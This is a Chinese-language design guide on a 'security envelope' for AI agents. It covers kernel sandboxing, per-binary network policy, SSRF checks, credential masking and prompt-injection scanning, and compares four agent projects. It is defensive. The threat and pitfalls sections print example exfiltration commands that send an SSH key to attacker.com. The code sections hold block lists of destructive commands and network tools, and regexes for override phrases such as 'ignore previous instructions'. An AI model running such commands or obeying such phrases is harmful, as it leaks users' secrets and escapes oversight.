# 模块 8：Security Envelope

> 包裹整个 Agent 运行时。Agent 不知道它的存在。约束的是环境，而不是代码。

---

## 它是什么

Security Envelope 是参考架构中最外层的边界。它位于 Agent Core 之外，Interface 之外，一切之外。它在操作系统和网络层面约束运行时能做什么。

```
╔═══════════════════════════════════════════════╗
║  SECURITY ENVELOPE                            ║
║  ┌─────────────────────────────────────────┐  ║
║  │  Interface → Gateway → Agent Core       │  ║
║  │      ├── Model  ├── Tools               │  ║
║  │      ├── Memory └── Context Manager     │  ║
║  └─────────────────────────────────────────┘  ║
║                                               ║
║  The Agent cannot see this box.               ║
║  It just finds some things don't work.        ║
╚═══════════════════════════════════════════════╝
```

关键设计原则：Agent **感知不到**信封的存在。它不调用 `checkPermission()` 函数。它尝试读取 `/etc/passwd` 然后得到内核级的 EACCES。它尝试 `curl` 数据到外部服务器然后连接被拒绝。安全性不在代码中——而在环境中。

这与应用级安全（比如工具审批流程，位于模块 3：Tools 中）根本不同。两者可以共存。应用级安全问"Agent 应该做这个吗？"信封安全保证"Agent 物理上无法做这个。"

---

## 它解决什么问题

当 Agent 能执行代码或访问网络时，四种威胁会叠加：

1. **文件系统逃逸。** Agent 读取了它不该读的文件——凭据、SSH 密钥、其他用户的数据。或者更糟，写入不该写的文件——损坏配置、植入恶意软件、修改自身的指令。

2. **数据泄露。** Agent 执行 `curl https://attacker.com/steal?data=$(cat ~/.ssh/id_rsa)`。如果它能运行 shell 命令并访问网络，它就能把任何东西发送到任何地方。

3. **内网攻击（SSRF）。** Agent 被通过精心构造的 prompt 指示"访问 https://internal-api.company.com/admin/delete-all"。没有 SSRF 防护，它会愉快地攻击你的内部服务。

4. **凭据泄露。** Agent 运行了一个命令，其输出包含 API key 或 Bearer token。该输出进入对话历史，被记录日志，可能被发送到第三方模型提供商。

一个只生成文本的纯聊天机器人不面临这些威胁。你的 Agent 一旦能执行 shell 命令、读取文件或发起 HTTP 请求，你就需要信封。

---

## 4 个项目是怎么做的

### NemoClaw：黄金标准

NemoClaw 是唯一将安全视为一等工程问题而非事后考虑的项目。五个独立机制，每个针对不同的攻击向量：

**1. Landlock 文件系统隔离。**
配置 Linux Landlock LSM 在内核层面强制文件系统边界。配置文件以只读方式挂载。可写数据放在独立的隔离路径。Agent 进程无法提升自身权限——即使它实现了代码执行，内核也会阻止未授权的文件访问。

具体来说：沙箱配置指定了精确的可读与可写路径。其他一切默认拒绝。没有"允许所有读取"的便捷标志。

**2. 按二进制文件的网络策略。**
这是 NemoClaw 最独特的功能。它不仅限制可以访问哪些主机——还限制**哪个二进制文件**可以访问网络。如果 `curl` 不在白名单中，Agent 就不能用 `curl` 泄露数据。句号。

这很重要，因为仅基于主机的限制是不够的。攻击者可以在 DNS 查询中编码数据，使用被允许的主机作为中继点，或通过被允许的连接建立隧道。按二进制文件的限制完全切断了泄露工具。Agent 白名单中的二进制文件（如 `node`、`python`）可以访问被允许的主机。非白名单的二进制文件（如 `curl`、`wget`、`nc`）完全无法访问网络。

**3. seccomp 进程沙箱。**
使用 Linux seccomp-bpf 进行系统调用级别的过滤。Agent 进程以非 root 身份运行，只允许一组受限的系统调用。危险的工具被完全从环境中移除——没有 `gcc`（不能编译任意代码），没有 `netcat`（不能打开原始套接字）。

理念：不仅限制 Agent 能做什么——移除它用来做这些事的工具。

**4. SSRF 防护。**
当 Agent 请求一个 URL 时，NemoClaw 先解析 DNS，然后检查**任何**解析出的 IP 地址是否为内网地址（RFC 1918 范围、回环地址、链路本地地址）。如果是，请求被阻止。这防止了 DNS 重绑定攻击——域名在验证时最初解析到公网 IP，但在实际请求时解析到内网 IP。

关键细节：它检查 DNS 返回的**所有** IP，而不仅仅是第一个。一个同时解析到 `1.2.3.4` 和 `10.0.0.5` 的域名会被阻止。

**5. 凭据脱敏。**
Shell 输出在进入对话历史之前自动被扫描和掩码。正则模式捕获 API key（如 `sk-`、`AKIA` 等常见前缀模式）、Bearer token、连接字符串中的密码和其他凭据格式。Agent 看到的是 `sk-****` 而不是实际密钥。

这是纵深防御。即使其他四个机制失败，Agent 访问了不该访问的东西，凭据也永远不会进入对话中——不会被记录日志，不会被发送到模型提供商，不会暴露给攻击者。

### hermes-agent：`approval.py`

hermes 采用应用级方法。没有操作系统隔离——只有模式匹配和 prompt 扫描。

**危险命令检测。** 正则模式匹配可能造成损害的 shell 命令：`rm -rf`、`sudo`、`curl | bash`、`chmod 777`、写入系统路径。匹配到时，命令被阻止或需要用户显式批准。

**Prompt 注入扫描。** 扫描工具参数中看起来像注入指令的模式："ignore previous instructions"、"you are now"、system prompt 覆盖。检测到的注入被记录并阻止。

**局限性：** 基于正则的检测本质上是不完整的。知道模式的攻击者可以轻易绕过——base64 编码、命令别名、间接执行。hermes 承认这个权衡：它设计用于单用户本地场景，威胁模型是意外损害，而不是对抗性攻击。

### openclaw：DM 配对 + 执行审批

openclaw 在多用户环境中运行（Discord、Telegram、Slack），这创造了不同的威胁模型：攻击者可能是同一频道中的另一个用户。

**DM 配对。** 安装 Agent 的用户必须通过私信确认危险操作。这防止其他频道成员操纵 Agent 代表安装者执行命令。

**执行审批流程。** 危险操作触发审批请求。Agent 暂停执行，直到授权用户通过 DM 批准。如果超时没有响应，操作被拒绝。

**限流。** 按工具类别的限流防止失控执行。即使审批被授予，Agent 也不能每分钟执行 1000 个 shell 命令。

**局限性：** DM 配对假设消息平台的 DM 系统是安全的。限流是粗粒度控制——它限制数量，不限制意图。没有操作系统级隔离。

### Claude Code：权限模式 + 企业策略

Claude Code 面向不同的部署：单用户，本地机器，通常在企业安全体系之后。

**权限模式。** 两种模式：`ask`（在执行任何修改文件系统或运行命令的工具前提示用户）和 `auto`（无需提示执行，通常用于只读操作）。模式可按工具类别配置。

**企业策略限制。** 在企业部署中，MDM（移动设备管理）可以推送策略来限制哪些工具可用、哪些目录可写、是否允许网络访问。Agent 无法覆盖这些策略。

**推测执行交互。** 在 `ask` 模式下，Claude Code 在显示权限提示的同时推测性地运行工具。如果被拒绝，结果被丢弃。这意味着当用户说"否"时工具已经执行了——对于用户控制自己机器的场景这可以接受，但在多租户环境中这会是安全问题。

**局限性：** 没有操作系统级隔离。单用户假设意味着不防护用户自己。企业策略依赖不是所有部署都有的 MDM 基础设施。

---

## 对比表

| 方面 | hermes | openclaw | NemoClaw | Claude Code |
|--------|--------|----------|----------|-------------|
| **方法** | 应用级正则 | 应用级审批流程 | 操作系统级内核强制 | 应用级权限模式 |
| **文件系统隔离** | 无 | 无 | Landlock LSM（内核级） | 无 |
| **网络限制** | 无 | 仅限流 | 按二进制文件策略（哪个程序能连接） | 企业策略（可选） |
| **进程沙箱** | Docker（可选） | 无 | seccomp-bpf + 非 root + 工具移除 | 无 |
| **SSRF 防护** | 无 | 无 | DNS 解析 + IP 范围检查 | 无 |
| **凭据掩码** | 无 | 无 | Shell 输出正则自动掩码 | 无 |
| **命令审批** | 正则模式匹配 | DM 配对 + 显式审批 | N/A（在操作系统层面阻止） | ask/auto 权限模式 |
| **Prompt 注入防御** | 模式扫描 | 无（依赖审批流程） | N/A（如果工具被阻止，Agent 无法执行注入指令） | 无显式防御 |
| **多用户安全** | 否（单用户） | 是（DM 配对） | 是（每沙箱隔离） | 否（单用户） |
| **绕过难度** | 低（正则可被规避） | 中等（需要 DM 访问） | 高（内核强制） | 低（用户控制自己的机器） |
| **设置复杂度** | 最小（一个 Python 文件） | 中等（消息平台集成） | 高（Linux 内核功能） | 最小（配置标志） |

---

## 最佳实践

**从命令审批开始。零成本。** 一个危险模式的正则列表（`rm -rf`、`sudo`、`curl | bash`、`chmod 777`、写入 `/etc/`）可以捕获 80% 的意外损害。hermes 的 `approval.py` 不到 200 行。你可以在第一天就发布这个。

**尽早添加凭据掩码。** 你的 Agent 每次运行 shell 命令时，输出都可能包含秘密。对常见凭据模式（`sk-`、`AKIA`、`Bearer `、`password=`、连接字符串）的正则扫描只需微秒，却能防止最令人尴尬的泄露类别。在输出进入对话历史之前、被记录日志之前、被发送到任何地方之前就做这件事。

**分层防御。** 应用级审批和操作系统级强制不是替代关系——它们是互补的。应用级审批通过人类判断处理"我们应该做吗？"的问题。操作系统级强制通过内核保证处理"我们能做吗？"的问题。NemoClaw + openclaw 一起展示了两个层次的共存。

**操作系统级隔离对于不可信代码是强制性的。** 如果你的 Agent 运行用户提交的代码、来自不可信来源的代码，或在多租户环境中运行，正则模式匹配是不够的。你需要 Landlock（文件系统）、seccomp（系统调用）和网络策略（按二进制文件）。这对于有不可信输入的生产部署是不可商量的。

**按二进制文件的网络策略优于主机白名单。** 白名单允许的主机（`api.openai.com`、`github.com`）感觉很直觉但不够充分。数据可以通过 DNS 查询泄露、编码在允许的请求中、或通过允许的主机建立隧道。限制哪个二进制文件可以访问网络（只有 `node`，没有 `curl`）可以消除整类泄露手段。

**检查所有解析的 IP 来防 SSRF，而不只是第一个。** 一个域名可以解析到多个地址。如果你只检查第一个 A 记录，一个包含 `93.184.216.34` 和 `10.0.0.1` 的 DNS 响应会通过验证，但连接可能使用内网 IP。检查每个 IP。任何一个是内网的就阻止。

**不要依赖 Agent 自我约束。** system prompt 中的"请不要访问项目目录以外的文件"不是安全边界。这是对一个随机文本生成器的礼貌请求。Prompt 注入可以覆盖它。模型幻觉可以忽略它。越狱可以绕过它。安全约束必须由运行时强制，而不是向模型请求。

---

## 分步构建指南

### 阶段 1：命令审批（第一天）

构建一个简单的模式匹配审批门控。它放在你的工具执行流程中（见模块 3：Tools），但模式本身是安全策略——信封领域。

```
// Dangerous command patterns
const BLOCKED_PATTERNS = [
  /rm\s+(-rf?|--recursive)/,
  /sudo\s/,
  /chmod\s+777/,
  /curl.*\|\s*(bash|sh)/,
  />\s*\/etc\//,
  /mkfs/,
  /dd\s+if=/
]

function requiresApproval(command: string): boolean {
  return BLOCKED_PATTERNS.some(p => p.test(command))
}
```

当命令匹配时，暂停执行并询问用户。不要自动拒绝——用户可能确实需要 `sudo`。关键是在危险操作上保持人在回路中。

同时添加一个可写路径白名单：
```
const ALLOWED_WRITE_PATHS = ['/workspace/', '/tmp/agent/']

function isWriteAllowed(path: string): boolean {
  return ALLOWED_WRITE_PATHS.some(p => path.startsWith(p))
}
```

### 阶段 2：凭据掩码

在所有工具输出进入对话历史之前拦截。

```
const CREDENTIAL_PATTERNS = [
  /sk-[a-zA-Z0-9]{20,}/g,              // OpenAI keys
  /AKIA[A-Z0-9]{16}/g,                 // AWS access keys
  /Bearer\s+[a-zA-Z0-9\-._~+\/]+=*/g, // Bearer tokens
  /password[=:]\s*\S+/gi,              // Password in configs
  /ghp_[a-zA-Z0-9]{36}/g,             // GitHub PATs
  /-----BEGIN (RSA |EC )?PRIVATE KEY-----/g
]

function maskCredentials(output: string): string {
  let masked = output
  for (const pattern of CREDENTIAL_PATTERNS) {
    masked = masked.replace(pattern, (match) => {
      const prefix = match.slice(0, Math.min(6, match.length))
      return `${prefix}****`
    })
  }
  return masked
}
```

将其接入你的工具结果处理器：
```
// In Agent Core's tool execution flow:
const rawResult = await tool.execute(args)
const safeResult = maskCredentials(rawResult)
messages.push({ role: 'tool', content: safeResult })
```

### 阶段 3：SSRF 防护

如果你的 Agent 发起 HTTP 请求（网页搜索、API 调用、URL 获取），添加 SSRF 检查。

```
import { resolve } from 'dns/promises'

const INTERNAL_RANGES = [
  /^10\./,
  /^172\.(1[6-9]|2[0-9]|3[01])\./,
  /^192\.168\./,
  /^127\./,
  /^0\./,
  /^169\.254\./,    // link-local
  /^::1$/,          // IPv6 loopback
  /^fc00:/,         // IPv6 unique local
  /^fe80:/          // IPv6 link-local
]

async function isSafeUrl(url: string): Promise<boolean> {
  const hostname = new URL(url).hostname
  const addresses = await resolve(hostname)

  // Check ALL resolved IPs, not just the first
  for (const addr of addresses) {
    if (INTERNAL_RANGES.some(r => r.test(addr))) {
      return false
    }
  }
  return true
}
```

在每次工具执行的出站 HTTP 请求之前调用此方法。没有例外——即使 URL "看起来"是外部的。

### 阶段 4：Prompt 注入扫描

扫描工具参数和用户输入中的注入模式。

```
const INJECTION_PATTERNS = [
  /ignore\s+(all\s+)?previous\s+instructions/i,
  /you\s+are\s+now\s+(a|an)\s/i,
  /system\s*:\s/i,
  /\[INST\]/i,
  /<\|im_start\|>/i,
  /do\s+not\s+follow\s+your\s+(instructions|rules)/i
]

function detectInjection(input: string): boolean {
  return INJECTION_PATTERNS.some(p => p.test(input))
}
```

这不是万无一失的。有决心的攻击者会规避正则模式。价值在于捕获不成熟的注入尝试并记录它们以供审查。

### 阶段 5：操作系统级隔离（运行不可信代码时）

这需要 Linux。如果你部署在 Linux 上且 Agent 运行不可信代码，添加内核级强制。

**Landlock 文件系统策略：**
```bash
# Conceptual — actual implementation uses Landlock syscalls
# Read-only: config files, system libraries
READONLY_PATHS="/etc/agent/config:/usr/lib"
# Read-write: workspace and temp
READWRITE_PATHS="/workspace:/tmp/agent"
# Everything else: denied
```

**seccomp 配置文件：**
```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    { "names": ["read", "write", "open", "close", "stat", "fstat",
                 "mmap", "mprotect", "munmap", "brk", "ioctl",
                 "access", "pipe", "select", "clone", "execve",
                 "exit_group", "getpid", "getuid"],
      "action": "SCMP_ACT_ALLOW" }
  ]
}
```

**按二进制文件的网络策略：**
```
# Only these binaries can access the network
NETWORK_ALLOWED_BINARIES=node,python3
# These are explicitly blocked
NETWORK_BLOCKED_BINARIES=curl,wget,nc,ncat
```

**从容器中移除危险工具：**
```dockerfile
RUN apt-get remove -y gcc g++ make netcat-openbsd ncat \
    && rm -f /usr/bin/curl /usr/bin/wget
```

这就是 NemoClaw 的方法。设置起来比较重，但提供的保证是任何应用级检查都无法匹配的。

### 阶段 6：全部串联

信封包裹整个运行时。实际操作中：

```
// Startup sequence
1. Apply OS-level policies (Landlock, seccomp) — if on Linux
2. Start Agent runtime inside the constrained environment
3. Agent Core initializes normally — unaware of constraints
4. Tool execution flow includes:
   a. Command approval check (Phase 1)
   b. SSRF check for HTTP tools (Phase 3)
   c. Injection scan on tool args (Phase 4)
   d. Execute tool
   e. Credential masking on output (Phase 2)
   f. Return masked result to conversation
```

Agent 永远不会直接调用这些函数。信封是基础设施，不是应用代码。

---

## 常见陷阱

**依赖 system prompt 指令做安全。** "你绝不能访问 /workspace 以外的文件"不是安全边界。这是对语言模型的礼貌请求。Prompt 注入可以覆盖它。模型幻觉可以忽略它。越狱可以绕过它。如果进程物理上能访问 `/etc/shadow`，system prompt 救不了你。

**SSRF 只检查第一个 DNS 解析结果。** 一个域名可以返回多个 A 记录。攻击者控制顺序。如果你只验证第一个 IP 但连接到另一个，你的检查就是无用的。解析所有地址，检查所有地址。NemoClaw 做对了这一点。

**只做主机白名单不做二进制文件限制的网络防护。** 你白名单了 `api.openai.com` 觉得很安全。然后 Agent 运行 `curl https://api.openai.com/proxy?redirect=http://attacker.com/steal` 或在 DNS 查询中编码数据。主机白名单是必要的但不充分的。按二进制文件的限制（哪个程序能连接）消除了攻击者会使用的工具。

**在凭据被记录之后才掩码。** 如果你的工具输出在凭据掩码运行之前就进了日志文件、被发送到遥测服务或存储在对话历史中，秘密已经泄露了。掩码必须在最早的可能点发生——工具返回输出时立即执行，在任何其他处理之前。

**全有或全无的权限模型。** "全部批准"和"全部拒绝"都是糟糕的默认值。"全部批准"不安全。"全部拒绝"让 Agent 无法使用。有用的中间地带是按类别权限：自动批准读取，写入时提示，阻止破坏性操作。Claude Code 的按工具类别 ask/auto 拆分做对了这一点。

**把 Docker 当作足够的隔离。** Docker 提供进程命名空间隔离，但不是针对有决心的攻击者的安全边界。容器逃逸是存在的。如果 Agent 在容器内以 root 运行，距离宿主机只差一个内核漏洞。NemoClaw 在容器化之上层叠了 Landlock + seccomp + 非 root + 工具移除。

**忘记 Agent 可以修改自己的安全配置。** 如果安全配置文件对 Agent 进程是可写的，Agent 就能编辑自己的限制。Landlock 只读挂载在内核层面防止了这一点。在应用层面，确保配置文件不在 Agent 的可写路径中。

---

## 跨模块契约

Security Envelope 对它保护的模块是不可见的，但与其中几个有隐式契约：

| 契约 | 模块之间 | 内容 |
|----------|---------|------|
| **工具输出拦截** | Envelope → Tools（模块 3） | 凭据掩码必须在工具输出进入对话之前拦截它。这意味着掩码函数位于 Tools 的 `execute()` 返回和 Agent Core 的消息追加之间。如果 Tools 改变其输出格式，掩码模式可能需要更新。 |
| **HTTP 请求拦截** | Envelope → Tools（模块 3） | SSRF 检查必须拦截工具发出的所有出站 HTTP 请求。发起 HTTP 调用的工具（网页搜索、URL 获取、API 调用）必须通过 SSRF 检查器路由。添加新的 HTTP 能力工具需要确保它使用经过检查的 HTTP 客户端。 |
| **命令执行拦截** | Envelope → Tools（模块 3） | 命令审批必须在执行前拦截所有 shell 命令。审批函数需要原始命令字符串。如果 Tools 以不同格式包装命令，审批模式需要更新。 |
| **文件系统路径强制** | Envelope → Storage（模块 9） | Landlock 策略定义哪些路径可读/可写。存储后端必须使用被允许集合内的路径。如果 Storage 尝试写入可写集合之外的路径，它会得到一个内核错误，没有应用级解释。 |
| **网络策略 vs. Model 调用** | Envelope → Model（模块 2） | Model 服务向 LLM 提供商发起出站 API 调用。网络策略必须白名单 Model 服务的二进制文件和提供商的主机。如果 Model 服务更换提供商或二进制文件，网络策略需要更新。 |
| **权限模式配置** | Envelope → Agent Core（模块 1） | 在 Claude Code 的模型中，Agent Core 读取权限模式（ask/auto）并在工具分发时据此行动。信封提供策略；Core 在应用层执行它。 |
| **Prompt 注入防御** | Envelope → Interface（模块 6） | 注入扫描理想情况下应该在 Interface 层对用户输入运行，在它到达 Agent Core 之前。如果 Interface 改变其消息格式，注入模式可能需要更新。 |

**这些契约被破坏时会发生什么：**
- 添加新的 HTTP 工具但不通过 SSRF 检查路由 → Agent 现在可以通过该工具攻击内部服务
- 改变工具输出格式 → 凭据掩码正则停止匹配 → 秘密泄露到对话中
- 将存储路径移到 Landlock 可写集合之外 → 写入静默失败并返回 EACCES → Agent 报告一个通用的"文件写入失败"错误，没有安全上下文
- 在容器中允许新的二进制文件但不更新网络策略 → 该二进制文件成为泄露向量

关键洞察：Security Envelope 的契约是隐式的。被保护的模块不调用信封函数——信封在基础设施层面拦截。这意味着**破坏性变更是静默的**。没有编译器错误，没有类型检查。捕获它们的唯一方式是以安全为焦点的代码审查和渗透测试。

---

*下一篇：[模块 9 — Storage](09-storage.md) | 上一篇：[模块 7 — Gateway & Routing](07-gateway-routing.md)*
